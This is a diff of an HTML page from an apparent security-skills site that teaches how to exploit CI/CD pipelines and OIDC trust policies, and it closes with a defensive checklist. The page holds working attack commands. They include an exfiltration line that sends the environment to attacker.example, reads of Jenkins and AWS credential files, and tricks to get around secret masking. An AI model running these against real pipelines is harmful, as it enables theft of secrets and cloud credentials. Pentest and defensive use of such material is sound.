@@ -5,11 +5,20 @@
     h1.sk{font-family:var(--mono);font-size:clamp(24px,4vw,36px);font-weight:600;letter-spacing:-.02em}
     .stags{display:flex;gap:16px;align-items:center;margin-top:16px;font-family:var(--mono);font-size:12.5px;color:var(--muted);flex-wrap:wrap}
     .sdesc{margin-top:22px;font-size:17px;color:var(--muted);max-width:70ch;line-height:1.55}
-    .inst{margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    .inst{position:relative;margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
     padding:13px 16px;font-family:var(--mono);font-size:13px;overflow-x:auto}
     .inst .p{color:var(--faint);user-select:none}
-    article{padding:44px 0 72px;border-top:1px solid var(--border)}
-    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px}
+    .slayout{display:grid;grid-template-columns:minmax(0,1fr) 214px;gap:52px;align-items:start;
+    padding:40px 0 40px;border-top:1px solid var(--border)}
+    .toc{position:sticky;top:76px}
+    .toc .tl{font-family:var(--mono);font-size:11px;color:var(--faint);margin-bottom:11px}
+    .toc a{display:block;color:var(--muted);font-size:12.5px;line-height:1.35;padding:5px 0 5px 14px;
+    border-left:1px solid var(--border);margin-left:-1px}
+    .toc a:hover{color:var(--text);text-decoration:none;border-color:var(--border2)}
+    .toc a.on{color:var(--text);border-color:var(--accent)}
+    article{min-width:0}
+    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px;scroll-margin-top:76px}
+    article h2:first-child{margin-top:0}
     article h3{font-size:16px;font-weight:640;margin:26px 0 8px}
     article h4{font-size:14px;font-weight:640;margin:20px 0 6px;color:var(--muted)}
     article p{margin:0 0 15px;max-width:74ch}
@@ -17,13 +26,15 @@
     article li{margin:5px 0}article li>ul{margin:5px 0}
     article code{font-family:var(--mono);font-size:.86em;background:var(--surface);padding:1px 5px;border-radius:4px}
     article a.xref code{color:var(--accent);background:color-mix(in srgb,var(--accent) 9%,var(--surface))}
+    .codeblk{position:relative;margin:0 0 18px}
     article pre{background:var(--surface);border:1px solid var(--border);border-radius:8px;
-    padding:15px 16px;overflow-x:auto;margin:0 0 18px;max-width:100%}
+    padding:15px 16px;overflow-x:auto;margin:0;max-width:100%}
     article pre code{background:none;padding:0;font-size:12.5px;line-height:1.7}
     article blockquote{margin:0 0 18px;padding:2px 0 2px 18px;border-left:2px solid var(--border2);color:var(--muted)}
     .tw{overflow-x:auto;margin:0 0 18px}article table{border-collapse:collapse;width:100%;font-size:14px}
     article th,article td{text-align:left;padding:9px 14px;border-bottom:1px solid var(--border);vertical-align:top}
     article th{font-family:var(--mono);font-size:12px;color:var(--muted);font-weight:600}
+    @media (max-width:820px){.slayout{grid-template-columns:1fr;gap:0}.toc{display:none}}
     </style></head><body>
 <div class="top"><div class="wrap"><a class="brand" href="index.html">secskills</a>
 <nav><a href="index.html#catalog">← all skills</a><a href="https://github.com/trilwu/secskills">github</a></nav>
@@ -36,11 +47,12 @@
     <span class="v"><svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg> verified 2026-07-27</span>
   </div>
   <p class="sdesc">Exploit CI/CD pipeline misconfigurations and OIDC federation weaknesses across GitHub Actions, GitLab CI, and Jenkins -- poisoned workflows, secret exfiltration, runner compromise, overly broad OIDC trust policies, build artifact poisoning, and credential theft. Use when pentesting CI/CD infrastructure, assessing OIDC federation trust boundaries, reviewing pipeline security posture, or exploiting a path from repository access to cloud credentials.</p>
-  <div class="inst"><span class="p">$ </span>/plugin install secskills-offense
+  <div class="inst cx"><button class="copy" data-copy="/plugin install secskills-offense
+/plugin install secskills-core">copy</button><span class="p">$ </span>/plugin install secskills-offense
 <span class="p">$ </span>/plugin install secskills-core</div>
 </div></header>
-<article><div class="wrap"><p>CI/CD pipelines are high-privilege execution environments, often with direct cloud IAM access, deploy credentials, and signing keys. OIDC federation turns a repository write into cloud credential issuance when the trust policy is too broad. A single misconfigured workflow or a wildcard subject claim can bridge the gap from "can open a pull request" to "has production cloud access."</p>
-<h2>When to Use</h2>
+<div class="wrap slayout"><article><p>CI/CD pipelines are high-privilege execution environments, often with direct cloud IAM access, deploy credentials, and signing keys. OIDC federation turns a repository write into cloud credential issuance when the trust policy is too broad. A single misconfigured workflow or a wildcard subject claim can bridge the gap from "can open a pull request" to "has production cloud access."</p>
+<h2 id="when-to-use">When to Use</h2>
 <ul>
 <li>Assessing GitHub Actions, GitLab CI, or Jenkins for exploitable misconfigurations</li>
 <li>Testing OIDC federation trust policies between CI providers and cloud platforms</li>
@@ -49,23 +61,36 @@
 <li>Attempting lateral movement from CI/CD into cloud accounts via OIDC</li>
 <li>Reviewing build artifact integrity and cache poisoning attack surface</li>
 </ul>
-<h2>When NOT to Use</h2>
+<h2 id="when-not-to-use">When NOT to Use</h2>
 <ul>
 <li><strong>Dependency and package supply chain attacks</strong> -- use <a class="xref" href="auditing-supply-chain.html"><code>auditing-supply-chain</code></a></li>
 <li><strong>Cloud IAM exploitation not originating from CI/CD</strong> -- use <a class="xref" href="exploiting-cloud-platforms.html"><code>exploiting-cloud-platforms</code></a></li>
 <li><strong>Static code review of pipeline definitions as pure source</strong> -- use <a class="xref" href="auditing-code-for-vulnerabilities.html"><code>auditing-code-for-vulnerabilities</code></a></li>
 </ul>
-<h2>GitHub Actions</h2>
+<h2 id="github-actions">GitHub Actions</h2>
 <h3>Poisoned Workflows</h3>
 <p><code>pull_request_target</code> runs in the base repo context with secrets and a write-scoped <code>GITHUB_TOKEN</code>, but can be triggered by a fork PR.</p>
-<pre><code># Find pull_request_target triggers that check out PR head code
+<div class="codeblk cx"><button class="copy" data-copy="# Find pull_request_target triggers that check out PR head code
+rg -n &#x27;pull_request_target&#x27; -A20 .github/workflows/ | rg &#x27;checkout|ref.*head&#x27;
+
+# Script injection: untrusted PR/issue data interpolated into run blocks
+rg -n &#x27;\$\{\{\s*github\.event\.(issue|pull_request|comment|review)&#x27; .github/workflows/">copy</button><pre><code># Find pull_request_target triggers that check out PR head code
 rg -n 'pull_request_target' -A20 .github/workflows/ | rg 'checkout|ref.*head'
 
 # Script injection: untrusted PR/issue data interpolated into run blocks
-rg -n '\$\{\{\s*github\.event\.(issue|pull_request|comment|review)' .github/workflows/</code></pre>
+rg -n '\$\{\{\s*github\.event\.(issue|pull_request|comment|review)' .github/workflows/</code></pre></div>
 <p><strong>Attack pattern:</strong> fork the repo, modify the checked-out code path (build script, Makefile, test harness), open a PR. The workflow executes your code with the base repo's secrets. Exfiltrate via DNS, HTTP callback, or artifact.</p>
 <h3>Secret Exfiltration and Token Scope</h3>
-<pre><code># Secrets are in the environment -- exfiltrate out-of-band
+<div class="codeblk cx"><button class="copy" data-copy="# Secrets are in the environment -- exfiltrate out-of-band
+env | base64 | curl -d @- https://attacker.example/exfil
+
+# GITHUB_TOKEN scope check
+curl -s -H &quot;Authorization: token $GITHUB_TOKEN&quot; \
+  https://api.github.com/repos/OWNER/REPO -I | grep &#x27;x-oauth-scopes&#x27;
+
+# Check if permissions are restricted in the workflow
+rg -n &#x27;permissions:&#x27; .github/workflows/
+rg -n &#x27;permissions:\s*write-all&#x27; .github/workflows/">copy</button><pre><code># Secrets are in the environment -- exfiltrate out-of-band
 env | base64 | curl -d @- https://attacker.example/exfil
 
 # GITHUB_TOKEN scope check
@@ -74,22 +99,36 @@ curl -s -H "Authorization: token $GITHUB_TOKEN" \
 
 # Check if permissions are restricted in the workflow
 rg -n 'permissions:' .github/workflows/
-rg -n 'permissions:\s*write-all' .github/workflows/</code></pre>
+rg -n 'permissions:\s*write-all' .github/workflows/</code></pre></div>
 <p>Unrestricted <code>GITHUB_TOKEN</code> defaults to read+write on contents, packages, and more. With a write-scoped token: push to branches, create releases, modify packages, approve deployments.</p>
 <h3>Self-Hosted Runner Compromise</h3>
 <p>Self-hosted runners on public repos are a critical finding. They persist between jobs, so a malicious workflow leaves implants for subsequent jobs.</p>
-<pre><code>rg -n 'runs-on:.*self-hosted' .github/workflows/
+<div class="codeblk cx"><button class="copy" data-copy="rg -n &#x27;runs-on:.*self-hosted&#x27; .github/workflows/
+
+# On a compromised runner: harvest credentials from prior jobs
+find / -name &#x27;.credentials&#x27; -o -name &#x27;.env&#x27; -o -name &#x27;*.pem&#x27; 2&gt;/dev/null
+cat /home/runner/.aws/credentials">copy</button><pre><code>rg -n 'runs-on:.*self-hosted' .github/workflows/
 
 # On a compromised runner: harvest credentials from prior jobs
 find / -name '.credentials' -o -name '.env' -o -name '*.pem' 2&gt;/dev/null
-cat /home/runner/.aws/credentials</code></pre>
+cat /home/runner/.aws/credentials</code></pre></div>
 <h3>Artifact Poisoning</h3>
-<pre><code># If a PR workflow uploads build artifacts consumed by a deploy workflow,
+<div class="codeblk cx"><button class="copy" data-copy="# If a PR workflow uploads build artifacts consumed by a deploy workflow,
 # the PR author controls what gets deployed
-rg -n 'upload-artifact|download-artifact' .github/workflows/</code></pre>
-<h2>GitLab CI</h2>
+rg -n &#x27;upload-artifact|download-artifact&#x27; .github/workflows/">copy</button><pre><code># If a PR workflow uploads build artifacts consumed by a deploy workflow,
+# the PR author controls what gets deployed
+rg -n 'upload-artifact|download-artifact' .github/workflows/</code></pre></div>
+<h2 id="gitlab-ci">GitLab CI</h2>
 <h3>Runner Tokens and Shared Runners</h3>
-<pre><code># Exposed runner registration tokens allow registering rogue runners
+<div class="codeblk cx"><button class="copy" data-copy="# Exposed runner registration tokens allow registering rogue runners
+rg -rn &#x27;RUNNER_TOKEN\|REGISTRATION_TOKEN\|CI_JOB_TOKEN&#x27; .gitlab-ci.yml
+
+# CI_JOB_TOKEN can access other projects if inter-project deps are configured
+curl --header &quot;JOB-TOKEN: $CI_JOB_TOKEN&quot; \
+  &quot;https://gitlab.example/api/v4/projects/OTHER_ID/repository/files/secret.txt/raw?ref=main&quot;
+
+# Shared runners: Docker socket mount leaks between jobs
+rg -n &#x27;docker:dind\|/var/run/docker.sock&#x27; .gitlab-ci.yml">copy</button><pre><code># Exposed runner registration tokens allow registering rogue runners
 rg -rn 'RUNNER_TOKEN\|REGISTRATION_TOKEN\|CI_JOB_TOKEN' .gitlab-ci.yml
 
 # CI_JOB_TOKEN can access other projects if inter-project deps are configured
@@ -97,18 +136,31 @@ curl --header "JOB-TOKEN: $CI_JOB_TOKEN" \
   "https://gitlab.example/api/v4/projects/OTHER_ID/repository/files/secret.txt/raw?ref=main"
 
 # Shared runners: Docker socket mount leaks between jobs
-rg -n 'docker:dind\|/var/run/docker.sock' .gitlab-ci.yml</code></pre>
+rg -n 'docker:dind\|/var/run/docker.sock' .gitlab-ci.yml</code></pre></div>
 <h3>CI Variables Extraction</h3>
-<pre><code># Masked variables are hidden from logs but present in env
+<div class="codeblk cx"><button class="copy" data-copy="# Masked variables are hidden from logs but present in env
 printenv &gt; /tmp/all_vars.txt &amp;&amp; cat /tmp/all_vars.txt
 
 # Protected variables: only on protected branches/tags
 # Push a tag matching the protection pattern to access them
-git tag release-exploit &amp;&amp; git push origin release-exploit</code></pre>
-<h2>OIDC Federation Abuse</h2>
+git tag release-exploit &amp;&amp; git push origin release-exploit">copy</button><pre><code># Masked variables are hidden from logs but present in env
+printenv &gt; /tmp/all_vars.txt &amp;&amp; cat /tmp/all_vars.txt
+
+# Protected variables: only on protected branches/tags
+# Push a tag matching the protection pattern to access them
+git tag release-exploit &amp;&amp; git push origin release-exploit</code></pre></div>
+<h2 id="oidc-federation-abuse">OIDC Federation Abuse</h2>
 <p>OIDC federation lets CI jobs assume cloud roles without stored credentials. The security boundary is the trust policy's subject claim filter.</p>
 <h3>Overly Broad Subject Claims</h3>
-<pre><code># AWS: inspect IAM role trust policy conditions
+<div class="codeblk cx"><button class="copy" data-copy="# AWS: inspect IAM role trust policy conditions
+aws iam get-role --role-name ci-deploy-role \
+  --query &#x27;Role.AssumeRolePolicyDocument&#x27; --output json
+
+# Dangerous patterns in the Condition block:
+# &quot;sub&quot;: &quot;repo:org/*&quot;                     -- any repo in the org
+# &quot;sub&quot;: &quot;repo:org/repo:*&quot;                -- any branch, any environment
+# &quot;sub&quot;: &quot;repo:org/repo:ref:refs/heads/*&quot; -- any branch
+# No Condition at all                      -- any token from the IdP">copy</button><pre><code># AWS: inspect IAM role trust policy conditions
 aws iam get-role --role-name ci-deploy-role \
   --query 'Role.AssumeRolePolicyDocument' --output json
 
@@ -116,9 +168,18 @@ aws iam get-role --role-name ci-deploy-role \
 # "sub": "repo:org/*"                     -- any repo in the org
 # "sub": "repo:org/repo:*"                -- any branch, any environment
 # "sub": "repo:org/repo:ref:refs/heads/*" -- any branch
-# No Condition at all                      -- any token from the IdP</code></pre>
+# No Condition at all                      -- any token from the IdP</code></pre></div>
 <p><strong>Vulnerable AWS trust policy:</strong></p>
-<pre><code>{
+<div class="codeblk cx"><button class="copy" data-copy="{
+  &quot;Effect&quot;: &quot;Allow&quot;,
+  &quot;Principal&quot;: {&quot;Federated&quot;: &quot;arn:aws:iam::ACCOUNT:oidc-provider/token.actions.githubusercontent.com&quot;},
+  &quot;Action&quot;: &quot;sts:AssumeRoleWithWebIdentity&quot;,
+  &quot;Condition&quot;: {
+    &quot;StringLike&quot;: {
+      &quot;token.actions.githubusercontent.com:sub&quot;: &quot;repo:org-name/*&quot;
+    }
+  }
+}">copy</button><pre><code>{
   "Effect": "Allow",
   "Principal": {"Federated": "arn:aws:iam::ACCOUNT:oidc-provider/token.actions.githubusercontent.com"},
   "Action": "sts:AssumeRoleWithWebIdentity",
@@ -127,10 +188,18 @@ aws iam get-role --role-name ci-deploy-role \
       "token.actions.githubusercontent.com:sub": "repo:org-name/*"
     }
   }
-}</code></pre>
+}</code></pre></div>
 <p>Any repo in the org can assume this role. Abandoned repos, docs repos, and repos with loose contributor policies become pivots to production cloud access.</p>
 <h3>GCP and Azure</h3>
-<pre><code># GCP: check attribute conditions on workload identity provider
+<div class="codeblk cx"><button class="copy" data-copy="# GCP: check attribute conditions on workload identity provider
+gcloud iam workload-identity-pools providers describe PROVIDER \
+  --location=global --workload-identity-pool=POOL
+# Vulnerable: no attribute condition, or condition matching only the org
+
+# Azure: list federated identity credentials
+az ad app federated-credential list --id APP_OBJECT_ID
+# Same wildcard risks: &quot;repo:org/*&quot; or &quot;repo:org/repo:ref:refs/heads/*&quot;
+# Safe: &quot;repo:org/repo:environment:production&quot;">copy</button><pre><code># GCP: check attribute conditions on workload identity provider
 gcloud iam workload-identity-pools providers describe PROVIDER \
   --location=global --workload-identity-pool=POOL
 # Vulnerable: no attribute condition, or condition matching only the org
@@ -138,59 +207,90 @@ gcloud iam workload-identity-pools providers describe PROVIDER \
 # Azure: list federated identity credentials
 az ad app federated-credential list --id APP_OBJECT_ID
 # Same wildcard risks: "repo:org/*" or "repo:org/repo:ref:refs/heads/*"
-# Safe: "repo:org/repo:environment:production"</code></pre>
+# Safe: "repo:org/repo:environment:production"</code></pre></div>
 <h3>Environment Protection Bypass</h3>
 <p>Environment protection rules gate OIDC token issuance only if the trust policy conditions include <code>:environment:</code>. A policy matching <code>repo:org/repo:*</code> ignores environments, so required reviewers provide no protection.</p>
-<pre><code>rg -n 'environment:' .github/workflows/
-# Compare to the trust policy Condition -- if it lacks :environment:, bypass</code></pre>
-<h2>Jenkins</h2>
+<div class="codeblk cx"><button class="copy" data-copy="rg -n &#x27;environment:&#x27; .github/workflows/
+# Compare to the trust policy Condition -- if it lacks :environment:, bypass">copy</button><pre><code>rg -n 'environment:' .github/workflows/
+# Compare to the trust policy Condition -- if it lacks :environment:, bypass</code></pre></div>
+<h2 id="jenkins">Jenkins</h2>
 <h3>Groovy Console and Credentials</h3>
-<pre><code># Script console (/script) runs arbitrary Groovy as SYSTEM
+<div class="codeblk cx"><button class="copy" data-copy="# Script console (/script) runs arbitrary Groovy as SYSTEM
+# Check for unauthenticated access
+curl -s -o /dev/null -w &quot;%{http_code}&quot; http://jenkins.target/script
+
+# Credential files on disk
+cat /var/lib/jenkins/credentials.xml
+cat /var/lib/jenkins/secrets/master.key
+cat /var/lib/jenkins/secrets/hudson.util.Secret">copy</button><pre><code># Script console (/script) runs arbitrary Groovy as SYSTEM
 # Check for unauthenticated access
 curl -s -o /dev/null -w "%{http_code}" http://jenkins.target/script
 
 # Credential files on disk
 cat /var/lib/jenkins/credentials.xml
 cat /var/lib/jenkins/secrets/master.key
-cat /var/lib/jenkins/secrets/hudson.util.Secret</code></pre>
+cat /var/lib/jenkins/secrets/hudson.util.Secret</code></pre></div>
 <h3>Pipeline Library Injection</h3>
-<pre><code># Shared libraries via @Library execute in the pipeline sandbox
+<div class="codeblk cx"><button class="copy" data-copy="# Shared libraries via @Library execute in the pipeline sandbox
+# If the library repo is writable, inject code into vars/ or src/
+rg -n &#x27;@Library\|library\(&#x27; Jenkinsfile
+
+# &quot;Load implicitly&quot; enabled = every pipeline runs the library&#x27;s code">copy</button><pre><code># Shared libraries via @Library execute in the pipeline sandbox
 # If the library repo is writable, inject code into vars/ or src/
 rg -n '@Library\|library\(' Jenkinsfile
 
-# "Load implicitly" enabled = every pipeline runs the library's code</code></pre>
-<h2>Secrets in CI</h2>
+# "Load implicitly" enabled = every pipeline runs the library's code</code></pre></div>
+<h2 id="secrets-in-ci">Secrets in CI</h2>
 <h3>Extracting Masked Variables</h3>
-<pre><code># Masking hides secrets from logs but not from the process environment
+<div class="codeblk cx"><button class="copy" data-copy="# Masking hides secrets from logs but not from the process environment
+echo &quot;$SECRET_VAR&quot; | base64                    # bypass log masking
+echo &quot;$SECRET_VAR&quot; | sed &#x27;s/./&amp;\n/g&#x27;           # char-by-char bypass
+echo &quot;$SECRET_VAR&quot; &gt; secret_dump.txt           # write to artifact">copy</button><pre><code># Masking hides secrets from logs but not from the process environment
 echo "$SECRET_VAR" | base64                    # bypass log masking
 echo "$SECRET_VAR" | sed 's/./&amp;\n/g'           # char-by-char bypass
-echo "$SECRET_VAR" &gt; secret_dump.txt           # write to artifact</code></pre>
+echo "$SECRET_VAR" &gt; secret_dump.txt           # write to artifact</code></pre></div>
 <h3>OIDC Token Interception</h3>
-<pre><code># GitHub Actions: request the OIDC token
+<div class="codeblk cx"><button class="copy" data-copy="# GitHub Actions: request the OIDC token
+curl -s -H &quot;Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN&quot; \
+  &quot;$ACTIONS_ID_TOKEN_REQUEST_URL&amp;audience=sts.amazonaws.com&quot;
+
+# JWT is reusable until expiry (typically 5-15 minutes)
+echo &quot;$TOKEN&quot; | cut -d. -f2 | base64 -d 2&gt;/dev/null | jq .">copy</button><pre><code># GitHub Actions: request the OIDC token
 curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
   "$ACTIONS_ID_TOKEN_REQUEST_URL&amp;audience=sts.amazonaws.com"
 
 # JWT is reusable until expiry (typically 5-15 minutes)
-echo "$TOKEN" | cut -d. -f2 | base64 -d 2&gt;/dev/null | jq .</code></pre>
+echo "$TOKEN" | cut -d. -f2 | base64 -d 2&gt;/dev/null | jq .</code></pre></div>
 <h3>Long-Lived Tokens as CI Secrets</h3>
-<pre><code># Credentials that should have been replaced by OIDC
+<div class="codeblk cx"><button class="copy" data-copy="# Credentials that should have been replaced by OIDC
+env | grep -i &#x27;AWS\|AKIA&#x27;                     # AWS access keys
+env | grep -i &#x27;AZURE\|ARM_CLIENT&#x27;             # Azure SP credentials
+find / -name &#x27;*service*account*.json&#x27; 2&gt;/dev/null  # GCP SA keys">copy</button><pre><code># Credentials that should have been replaced by OIDC
 env | grep -i 'AWS\|AKIA'                     # AWS access keys
 env | grep -i 'AZURE\|ARM_CLIENT'             # Azure SP credentials
-find / -name '*service*account*.json' 2&gt;/dev/null  # GCP SA keys</code></pre>
-<h2>Build Artifact Poisoning</h2>
+find / -name '*service*account*.json' 2&gt;/dev/null  # GCP SA keys</code></pre></div>
+<h2 id="build-artifact-poisoning">Build Artifact Poisoning</h2>
 <h3>Cache Poisoning</h3>
-<pre><code># CI caches shared across branches -- a PR can poison the main-branch cache
+<div class="codeblk cx"><button class="copy" data-copy="# CI caches shared across branches -- a PR can poison the main-branch cache
+rg -n &#x27;actions/cache&#x27; -A5 .github/workflows/
+# Check whether cache keys include dependency lock file hashes
+
+rg -n &#x27;cache:&#x27; -A10 .gitlab-ci.yml
+# key: $CI_COMMIT_REF_SLUG is branch-scoped but forks may share">copy</button><pre><code># CI caches shared across branches -- a PR can poison the main-branch cache
 rg -n 'actions/cache' -A5 .github/workflows/
 # Check whether cache keys include dependency lock file hashes
 
 rg -n 'cache:' -A10 .gitlab-ci.yml
-# key: $CI_COMMIT_REF_SLUG is branch-scoped but forks may share</code></pre>
+# key: $CI_COMMIT_REF_SLUG is branch-scoped but forks may share</code></pre></div>
 <h3>Dependency Confusion via Internal Registries</h3>
-<pre><code># If CI resolves from both internal and public registries,
+<div class="codeblk cx"><button class="copy" data-copy="# If CI resolves from both internal and public registries,
+# a higher-version public package wins resolution
+rg -rn &#x27;registry\|index-url\|repository&#x27; .npmrc .yarnrc pip.conf pyproject.toml
+# Non-scoped internal packages (@org/pkg format) are vulnerable">copy</button><pre><code># If CI resolves from both internal and public registries,
 # a higher-version public package wins resolution
 rg -rn 'registry\|index-url\|repository' .npmrc .yarnrc pip.conf pyproject.toml
-# Non-scoped internal packages (@org/pkg format) are vulnerable</code></pre>
-<h2>Defensive Review Checklist</h2>
+# Non-scoped internal packages (@org/pkg format) are vulnerable</code></pre></div>
+<h2 id="defensive-review-checklist">Defensive Review Checklist</h2>
 <p><strong>OIDC subject claim strictness:</strong></p>
 <ul>
 <li>[ ] Trust policies pin to specific repository (not org-wide wildcard)</li>
@@ -223,7 +323,7 @@ rg -rn 'registry\|index-url\|repository' .npmrc .yarnrc pip.conf pyproject.toml
 <li>[ ] Build artifacts are signed and verified before deployment</li>
 <li>[ ] Internal packages use scoped registries with no public fallback</li>
 </ul>
-<h2>Rationalizations to Reject</h2>
+<h2 id="rationalizations-to-reject">Rationalizations to Reject</h2>
 <ul>
 <li><em>"The OIDC trust policy is org-scoped, and we trust all our repos."</em></li>
 </ul>
@@ -252,7 +352,7 @@ rg -rn 'registry\|index-url\|repository' .npmrc .yarnrc pip.conf pyproject.toml
 <li><em>"The pipeline code is reviewed before merge."</em> Review of the pipeline</li>
 </ul>
 <p>definition does not protect against <code>pull_request_target</code>, which runs the attacker's code before any merge.</p>
-<h2>ATT&amp;CK Coverage</h2>
+<h2 id="att-ck-coverage">ATT&amp;CK Coverage</h2>
 <p><em>Generated from <code>secskills-core/ttp-index.json</code> — edit that file, then run <code>python3 scripts/sync_attack.py --write</code>. Re-verify IDs against the current ATT&amp;CK release before citing them in a report.</em></p>
 <p><strong>Initial Access</strong> (TA0001)</p>
 <ul>
@@ -263,11 +363,14 @@ rg -rn 'registry\|index-url\|repository' .npmrc .yarnrc pip.conf pyproject.toml
 <li><a href="https://attack.mitre.org/techniques/T1552/">T1552</a> Unsecured Credentials — see also <a class="xref" href="escalating-linux-privileges.html"><code>escalating-linux-privileges</code></a>, <a class="xref" href="exploiting-cloud-platforms.html"><code>exploiting-cloud-platforms</code></a>, <a class="xref" href="auditing-supply-chain.html"><code>auditing-supply-chain</code></a></li>
 </ul>
 <p>Detection content for any of these: <a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a>. Proactive search: <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a>. Post-compromise: <a class="xref" href="responding-to-incidents.html"><code>responding-to-incidents</code></a>.</p>
-<h2>References</h2>
+<h2 id="references">References</h2>
 <ul>
 <li><a class="xref" href="auditing-supply-chain.html"><code>auditing-supply-chain</code></a> -- dependency and package-level supply chain attacks</li>
 <li><a class="xref" href="exploiting-cloud-platforms.html"><code>exploiting-cloud-platforms</code></a> -- cloud IAM exploitation beyond CI/CD origins</li>
 <li><a class="xref" href="auditing-code-for-vulnerabilities.html"><code>auditing-code-for-vulnerabilities</code></a> -- source-level review of pipeline code</li>
 <li><a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a> -- building alerts for CI/CD abuse patterns</li>
-</ul></div></article>
-<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script></body></html>
+</ul></article><aside class="toc"><div class="tl">On this page</div><nav><a href="#when-to-use">When to Use</a><a href="#when-not-to-use">When NOT to Use</a><a href="#github-actions">GitHub Actions</a><a href="#gitlab-ci">GitLab CI</a><a href="#oidc-federation-abuse">OIDC Federation Abuse</a><a href="#jenkins">Jenkins</a><a href="#secrets-in-ci">Secrets in CI</a><a href="#build-artifact-poisoning">Build Artifact Poisoning</a><a href="#defensive-review-checklist">Defensive Review Checklist</a><a href="#rationalizations-to-reject">Rationalizations to Reject</a><a href="#att-ck-coverage">ATT&amp;CK Coverage</a><a href="#references">References</a></nav></aside></div>
+<footer><div class="wrap"><div class="mono">secskills · offense · verified 2026-07-27</div>
+<a class="mono" href="index.html#catalog">← all skills</a></div></footer>
+<script>(function(){var ls=[].slice.call(document.querySelectorAll('.toc a'));if(!ls.length)return;var hs=ls.map(function(a){return document.getElementById(a.getAttribute('href').slice(1));});function on(){var y=scrollY+90,c=0;for(var i=0;i<hs.length;i++){if(hs[i]&&hs[i].offsetTop<=y)c=i;}ls.forEach(function(a,i){a.classList.toggle('on',i===c);});}addEventListener('scroll',on,{passive:true});on();})();</script>
+<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script><script>(function(){var t=document.createElement('div');t.className='toast';t.setAttribute('role','status');document.body.appendChild(t);var tm;function toast(m){t.textContent=m;t.classList.add('on');clearTimeout(tm);tm=setTimeout(function(){t.classList.remove('on')},1500);}document.addEventListener('click',function(e){var b=e.target.closest('[data-copy]');if(!b)return;var x=b.getAttribute('data-copy');navigator.clipboard.writeText(x).then(function(){toast('Copied to clipboard');if(b.classList.contains('copy')||b.classList.contains('copy2')){var o=b.textContent;b.textContent='copied';b.classList.add('ok');setTimeout(function(){b.textContent=o;b.classList.remove('ok')},1400);}},function(){toast('Copy failed');});});})();</script></body></html>
